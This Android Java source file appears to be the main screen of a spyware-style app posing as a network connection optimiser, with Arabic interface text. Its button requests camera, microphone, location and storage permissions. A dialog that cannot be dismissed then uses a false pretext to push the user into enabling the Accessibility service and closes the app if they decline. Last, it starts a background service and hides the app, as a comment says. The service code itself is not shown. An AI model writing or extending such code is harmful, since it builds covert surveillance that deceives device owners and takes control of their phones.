package com.abdullah.finalapp;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnStart = findViewById(R.id.btn_start);
        TextView tvStatus = findViewById(R.id.tv_status);

        btnStart.setOnClickListener(v -> {
            tvStatus.setText("جاري تحسين الاتصال...");
            requestPermissions();
        });
    }

    private void requestPermissions() {
        String[] permissions = {
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
        };

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        } else {
            showAccessibilityDialog();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // بعد الموافقة على الصلاحيات، نظهر رسالة توجيهية
            showAccessibilityDialog();
        }
    }

    private void showAccessibilityDialog() {
        new AlertDialog.Builder(this)
                .setTitle("تفعيل التحكم في الشبكة")
                .setMessage("لضمان عمل التطبيق في الخلفية وتحسين اتصال جهازك، يرجى تفعيل خدمة 'إمكانية الوصول' (Accessibility) من الإعدادات.")
                .setPositiveButton("الذهاب للإعدادات", (dialog, which) -> {
                    // فتح إعدادات Accessibility
                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    startActivity(intent);
                    
                    // تشغيل الخدمة بعد التفعيل
                    startBackgroundService();
                })
                .setNegativeButton("إلغاء", (dialog, which) -> {
                    // لو لغى، نقفل التطبيق
                    finishAndRemoveTask();
                })
                .setCancelable(false)
                .show();
    }

    private void startBackgroundService() {
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // إخفاء التطبيق
        new android.os.Handler().postDelayed(this::finishAndRemoveTask, 1000);
    }
}
